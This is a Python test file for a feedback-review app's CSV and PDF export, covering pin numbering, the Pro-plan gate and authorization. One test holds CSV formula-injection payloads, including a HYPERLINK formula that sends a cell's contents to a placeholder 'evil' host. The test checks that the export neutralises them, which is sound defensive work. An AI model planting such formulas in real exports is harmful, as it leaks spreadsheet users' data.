"""Export tests (CLAUDE.md Sections 8, 9).

Two layers:
* DB-free unit tests for ``export_service`` — CSV shape, per-page pin numbering
  (mirrors the canvas), region cell, and a valid non-empty PDF (incl. the
  empty-review state). These run anywhere reportlab is installed.
* Integration tests for ``GET /reviews/{id}/export`` — auth/ownership (404),
  the Pro gate (free/past_due → 403, trialing/active → 200), content types and
  the attachment Content-Disposition, one row per top-level comment, and that
  an empty review still exports cleanly.

No network is touched (export is pure DB → file), so nothing is mocked.
"""

from __future__ import annotations

import csv
import io
from datetime import datetime, timezone

import pypdf

from app.models.user import User
from app.services import export_service as ex
from tests.conftest import make_project, make_user


def _pdf_text(content: bytes) -> str:
    """Extract all text from a PDF (reportlab compresses streams, so the bytes
    aren't greppable directly)."""
    reader = pypdf.PdfReader(io.BytesIO(content))
    return "\n".join(page.extract_text() for page in reader.pages)


# asyncio_mode="auto" (pyproject) runs the async integration tests without a
# mark; the pure unit tests below stay synchronous.

PAGE = "https://staging.example.com/about"
OTHER_PAGE = "https://staging.example.com/pricing"


# --- unit: grouping / numbering ---------------------------------------------


def _rec(
    page, status, created, *, name="Jane", typ="client", body="x", rw=None, rh=None
):
    return ex.CommentRecord(
        page_url=page,
        status=status,
        author_name=name,
        author_type=typ,
        body=body,
        region_width=rw,
        region_height=rh,
        created_at=created,
    )


def _t(minute: int) -> datetime:
    return datetime(2026, 6, 15, 12, minute, tzinfo=timezone.utc)


def test_numbering_is_per_page_in_creation_order():
    # Two URL spellings of the same page (fragment + trailing slash) must group
    # together and number 1,2 — exactly like the canvas' numberCommentsForPage.
    records = [
        _rec(PAGE + "#hero", "open", _t(0)),
        _rec(OTHER_PAGE, "open", _t(1)),
        _rec(PAGE + "/", "resolved", _t(2)),
    ]
    groups = ex.group_and_number(records)
    by_page = {g.page_url: [nr.number for nr in g.rows] for g in groups}
    assert by_page == {
        "https://staging.example.com/about": [1, 2],
        "https://staging.example.com/pricing": [1],
    }
    # Pages emitted in first-comment chronological order.
    assert [g.page_url for g in groups][0] == "https://staging.example.com/about"


def test_summarise_counts_total_and_resolved():
    groups = ex.group_and_number(
        [
            _rec(PAGE, "open", _t(0)),
            _rec(PAGE, "resolved", _t(1)),
            _rec(PAGE, "resolved", _t(2)),
        ]
    )
    assert ex.summarise(groups) == (3, 2)


# --- unit: CSV ---------------------------------------------------------------


def test_csv_header_and_one_row_per_comment():
    groups = ex.group_and_number(
        [
            _rec(PAGE, "open", _t(0), name="Alice", typ="client", body="Make it pop"),
            _rec(PAGE, "resolved", _t(1), name="Dev", typ="designer", body="done"),
        ]
    )
    rows = list(csv.reader(io.StringIO(ex.comments_to_csv(groups))))
    assert rows[0] == ex.CSV_HEADER
    assert len(rows) == 3  # header + 2
    # number, status label, author, type (capitalised), body, region, url, iso
    assert rows[1][0] == "1"
    assert rows[1][1] == "Open"
    assert rows[1][2] == "Alice"
    assert rows[1][3] == "Client"
    assert rows[1][4] == "Make it pop"
    assert rows[2][3] == "Designer"


def test_csv_region_cell():
    groups = ex.group_and_number(
        [
            _rec(PAGE, "open", _t(0)),  # point comment
            _rec(PAGE, "open", _t(1), rw=320.4, rh=180.6),  # region
        ]
    )
    rows = list(csv.reader(io.StringIO(ex.comments_to_csv(groups))))
    assert rows[1][5] == "No"
    assert rows[2][5] == "320x181"  # rounded WxH


def test_csv_empty_is_header_only():
    out = ex.comments_to_csv(ex.group_and_number([]))
    rows = list(csv.reader(io.StringIO(out)))
    assert rows == [ex.CSV_HEADER]


def test_csv_preserves_special_characters():
    groups = ex.group_and_number(
        [
            _rec(
                PAGE,
                "open",
                _t(0),
                name="Jane & Co",
                body='Line 1\nLine 2, "quoted" <b>',
            )
        ]
    )
    rows = list(csv.reader(io.StringIO(ex.comments_to_csv(groups))))
    # csv round-trips the embedded newline, comma, quotes and angle brackets.
    # (None of these begins with a formula trigger, so they are untouched.)
    assert rows[1][2] == "Jane & Co"
    assert rows[1][4] == 'Line 1\nLine 2, "quoted" <b>'


def test_csv_neutralises_formula_injection():
    """A guest-controlled body/name that begins with a spreadsheet formula
    trigger (= + - @ TAB CR) is prefixed with ' so Excel/Sheets treats it as
    text — OWASP CSV injection mitigation."""
    payloads = [
        '=HYPERLINK("http://evil/?x="&A1,"click")',
        "+1+1",
        "-1+1",
        "@SUM(A1)",
        "\t=1+1",
    ]
    groups = ex.group_and_number(
        [_rec(PAGE, "open", _t(i), name=p, body=p) for i, p in enumerate(payloads)]
    )
    rows = list(csv.reader(io.StringIO(ex.comments_to_csv(groups))))
    for row in rows[1:]:
        assert row[2].startswith("'"), row[2]  # author
        assert row[4].startswith("'"), row[4]  # body
    # a benign value is left exactly as-is
    benign = ex.group_and_number([_rec(PAGE, "open", _t(0), name="Jane", body="hi")])
    benign_rows = list(csv.reader(io.StringIO(ex.comments_to_csv(benign))))
    assert benign_rows[1][2] == "Jane"
    assert benign_rows[1][4] == "hi"


def test_normalize_page_url_strips_default_ports_and_fragment():
    # default ports collapse so :80/:443 and the bare form group together
    assert ex.normalize_page_url("http://Example.com:80/a/") == "http://example.com/a"
    assert ex.normalize_page_url("https://example.com:443/a") == "https://example.com/a"
    # a non-default port is preserved
    assert ex.normalize_page_url("http://example.com:8080/a") == (
        "http://example.com:8080/a"
    )
    # fragment dropped, query kept
    assert ex.normalize_page_url("https://x.com/p?q=1#frag") == "https://x.com/p?q=1"


# --- unit: PDF ---------------------------------------------------------------


def _pdf(groups):
    return ex.comments_to_pdf(
        groups,
        project_name="Acme Co.",
        review_name="Round 1",
        review_url="http://localhost:5173/r/abc12345",
        exported_at=datetime(2026, 6, 15, tzinfo=timezone.utc),
    )


def test_pdf_is_valid_and_nonempty():
    groups = ex.group_and_number(
        [
            _rec(PAGE, "open", _t(0), body="needs <fixing> & polish"),
            _rec(PAGE, "resolved", _t(1), rw=200.0, rh=100.0),
        ]
    )
    pdf = _pdf(groups)
    assert pdf[:5] == b"%PDF-"
    assert pdf.rstrip().endswith(b"%%EOF")
    assert len(pdf) > 1000


def test_pdf_renders_comment_content():
    """The PDF actually contains the pin numbers, bodies, status and page path —
    not just valid wrapper bytes (reportlab compresses streams, so extract text)."""
    groups = ex.group_and_number(
        [
            _rec(PAGE, "open", _t(0), body="Fix the header alignment"),
            _rec(PAGE, "resolved", _t(1), body="Logo is too small"),
        ]
    )
    text = _pdf_text(_pdf(groups))
    assert "ORVELLE" in text
    assert "#1" in text and "#2" in text
    assert "Fix the header alignment" in text
    assert "Logo is too small" in text
    assert "OPEN" in text and "RESOLVED" in text
    assert "/ABOUT" in text  # the page-section heading (rendered upper-case)
    assert "2 comments" in text and "1 resolved" in text


def test_pdf_empty_review_renders_without_crashing():
    pdf = _pdf(ex.group_and_number([]))
    assert pdf[:5] == b"%PDF-"
    assert len(pdf) > 500
    assert "No comments on this review yet" in _pdf_text(pdf)


def test_pdf_non_latin_text_does_not_crash():
    """Non-Latin-1 names/bodies (CJK, Cyrillic, emoji) must not raise — at worst
    they degrade to blanks when no Unicode font is on the host."""
    groups = ex.group_and_number(
        [_rec(PAGE, "open", _t(0), name="李明 Привет", body="مرحبا 🎨 world")]
    )
    pdf = _pdf(groups)
    assert pdf[:5] == b"%PDF-"
    assert len(pdf) > 1000


def test_pdf_handles_missing_review_name_and_markup():
    pdf = ex.comments_to_pdf(
        ex.group_and_number([_rec(PAGE, "open", _t(0), body="<script>&amp;")]),
        project_name="A & B <Studio>",
        review_name=None,
        review_url="http://x/r/y",
        exported_at=datetime(2026, 6, 15, tzinfo=timezone.utc),
    )
    assert pdf[:5] == b"%PDF-"


# --- unit: filename ----------------------------------------------------------


def test_export_filename_slug():
    assert ex.export_filename("Acme Co.", "Round 1", "pdf") == (
        "orvelle-acme-co-round-1-feedback.pdf"
    )
    assert ex.export_filename("", None, "csv") == "orvelle-review-feedback.csv"
    assert ex.export_filename("Café Münchën!!", None, "csv") == (
        "orvelle-caf-m-nch-n-feedback.csv"
    )


# --- integration helpers -----------------------------------------------------


async def _seed_user(session_factory, *, plan="pro", sub_status=None):
    user = await make_user(session_factory, plan)
    if sub_status is not None:
        async with session_factory() as s:
            db_user = await s.get(User, user.id)
            db_user.subscription_status = sub_status
            await s.commit()
    return user


async def _make_review(client, project_id):
    resp = await client.post(f"/api/v1/projects/{project_id}/reviews", json={})
    assert resp.status_code == 201, resp.text
    return resp.json()


async def _designer_comment(
    client, review_id, *, body="Comment", page_url=PAGE, region=False
):
    payload = {"body": body, "page_url": page_url}
    if region:
        payload |= {
            "region_width": 320.0,
            "region_height": 180.0,
            "region_width_percent": 25.0,
            "region_height_percent": 40.0,
        }
    resp = await client.post(f"/api/v1/reviews/{review_id}/comments", json=payload)
    assert resp.status_code == 201, resp.text
    return resp.json()


# --- integration: the export endpoint ---------------------------------------


async def test_owner_exports_csv(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    await _designer_comment(client, review["id"], body="First")
    await _designer_comment(client, review["id"], body="Second", region=True)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"].startswith("text/csv")
    # Full filename slug is wired through from project.name ("P" by default).
    assert (
        resp.headers["content-disposition"]
        == 'attachment; filename="orvelle-p-feedback.csv"'
    )
    assert resp.content  # non-empty

    rows = list(csv.reader(io.StringIO(resp.text)))
    assert rows[0] == ex.CSV_HEADER
    assert len(rows) == 3  # header + 2 top-level comments
    assert [r[0] for r in rows[1:]] == ["1", "2"]  # pin numbers through the route
    assert [r[4] for r in rows[1:]] == ["First", "Second"]
    assert rows[2][5] == "320x180"  # region WxH


async def test_export_numbers_pins_per_page(client, auth, session_factory):
    """End-to-end: comments across two pages restart numbering at 1 per page
    (mirroring the canvas), and each row carries its page's URL. Exercises the
    full route → group_and_number → CSV path with >1 page."""
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    # interleaved in creation order: PAGE, OTHER_PAGE, PAGE
    await _designer_comment(client, review["id"], body="a1", page_url=PAGE)
    await _designer_comment(client, review["id"], body="b1", page_url=OTHER_PAGE)
    await _designer_comment(client, review["id"], body="a2", page_url=PAGE)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    rows = list(csv.reader(io.StringIO(resp.text)))[1:]
    by_page: dict[str, list[tuple[str, str]]] = {}
    for r in rows:
        by_page.setdefault(r[6], []).append((r[0], r[4]))  # (Number, Comment)
    assert by_page[PAGE] == [("1", "a1"), ("2", "a2")]
    assert by_page[OTHER_PAGE] == [("1", "b1")]


async def test_owner_exports_pdf(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    await _designer_comment(client, review["id"], body="Needs work")

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=pdf")
    assert resp.status_code == 200, resp.text
    assert resp.headers["content-type"] == "application/pdf"
    assert resp.headers["content-disposition"].endswith('feedback.pdf"')
    assert resp.content[:5] == b"%PDF-"
    assert len(resp.content) > 1000


async def test_default_format_is_csv(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export")
    assert resp.status_code == 200
    assert resp.headers["content-type"].startswith("text/csv")


async def test_invalid_format_is_422(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=xml")
    assert resp.status_code == 422


async def test_empty_review_exports_cleanly(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    csv_resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert csv_resp.status_code == 200
    rows = list(csv.reader(io.StringIO(csv_resp.text)))
    assert rows == [ex.CSV_HEADER]  # header only, no crash

    pdf_resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=pdf")
    assert pdf_resp.status_code == 200
    assert pdf_resp.content[:5] == b"%PDF-"


async def test_replies_excluded_from_export(client, auth, session_factory):
    """Only top-level pins are exported (the canvas comment list); a reply must
    not produce its own row."""
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    parent = await _designer_comment(client, review["id"], body="Top level")
    reply = await client.post(
        f"/api/v1/comments/{parent['id']}/reply", json={"body": "a reply"}
    )
    assert reply.status_code == 201

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    rows = list(csv.reader(io.StringIO(resp.text)))
    assert len(rows) == 2  # header + the single top-level comment
    assert rows[1][4] == "Top level"


async def test_soft_deleted_comment_excluded(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    await _designer_comment(client, review["id"], body="keep me")
    drop = await _designer_comment(client, review["id"], body="delete me")
    assert (await client.delete(f"/api/v1/comments/{drop['id']}")).status_code == 204

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    rows = list(csv.reader(io.StringIO(resp.text)))
    assert len(rows) == 2  # header + the surviving comment
    assert rows[1][4] == "keep me"


# --- integration: ownership + the Pro gate ----------------------------------


async def test_cross_user_export_is_404(client, auth, session_factory):
    owner = await _seed_user(session_factory, plan="pro")
    auth.user = owner
    project = await make_project(session_factory, owner)
    review = await _make_review(client, project.id)

    # A different (also Pro) user must not reach another's review — 404, not 403.
    other = await _seed_user(session_factory, plan="pro")
    auth.user = other
    for fmt in ("csv", "pdf"):
        resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format={fmt}")
        assert resp.status_code == 404, fmt


async def test_free_user_blocked_with_403(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="free")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    await _designer_comment(client, review["id"], body="hi")

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert resp.status_code == 403
    assert resp.json()["detail"] == "Export is a Pro feature"


async def test_past_due_pro_blocked_with_403(client, auth, session_factory):
    """A lapsed subscriber is projected to plan='free' by the billing webhook
    (plan_for_status maps past_due → free), and the gate reads `plan`, so they're
    blocked. This asserts the projected free state; see the next test for proof
    that `plan` — not the raw status string — is what's authoritative."""
    user = await _seed_user(session_factory, plan="free", sub_status="past_due")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert resp.status_code == 403
    assert resp.json()["detail"] == "Export is a Pro feature"


async def test_plan_is_authoritative_over_raw_status(client, auth, session_factory):
    """The gate keys off `user.plan` (the access projection), not the raw Stripe
    status. A user the webhook left at plan='pro' exports fine even if a stale
    subscription_status string says past_due — plan is the source of truth."""
    user = await _seed_user(session_factory, plan="pro", sub_status="past_due")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert resp.status_code == 200


async def test_trialing_pro_allowed(client, auth, session_factory):
    """A trialing Pro user (plan='pro', status='trialing') has full export
    access — proving the gate honours the Stripe-driven plan projection."""
    user = await _seed_user(session_factory, plan="pro", sub_status="trialing")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert resp.status_code == 200


async def test_studio_user_allowed(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="studio", sub_status="active")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=pdf")
    assert resp.status_code == 200
    assert resp.content[:5] == b"%PDF-"


async def test_export_requires_authentication(client, auth, session_factory):
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)

    auth.user = None  # the get_current_user override now raises 401
    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    assert resp.status_code == 401


async def test_client_and_designer_author_types_in_csv(client, auth, session_factory):
    """A guest (client) comment and a designer comment surface the right author
    type and name in the CSV."""
    user = await _seed_user(session_factory, plan="pro")
    auth.user = user
    project = await make_project(session_factory, user)
    review = await _make_review(client, project.id)
    # designer-authored
    await _designer_comment(client, review["id"], body="from designer")
    # guest (client) authored, slightly later
    auth.user = None
    token_resp = await client.post(
        f"/api/v1/r/{review['slug']}/session", json={"display_name": "Clienta"}
    )
    token = token_resp.json()["session_token"]
    await client.post(
        f"/api/v1/r/{review['slug']}/comments",
        headers={"X-Guest-Token": token},
        json={"body": "from client", "page_url": PAGE},
    )

    auth.user = user
    resp = await client.get(f"/api/v1/reviews/{review['id']}/export?format=csv")
    rows = list(csv.reader(io.StringIO(resp.text)))
    by_body = {r[4]: r for r in rows[1:]}
    assert by_body["from designer"][3] == "Designer"
    assert by_body["from designer"][2] == "Tester"  # make_user full_name
    assert by_body["from client"][3] == "Client"
    assert by_body["from client"][2] == "Clienta"
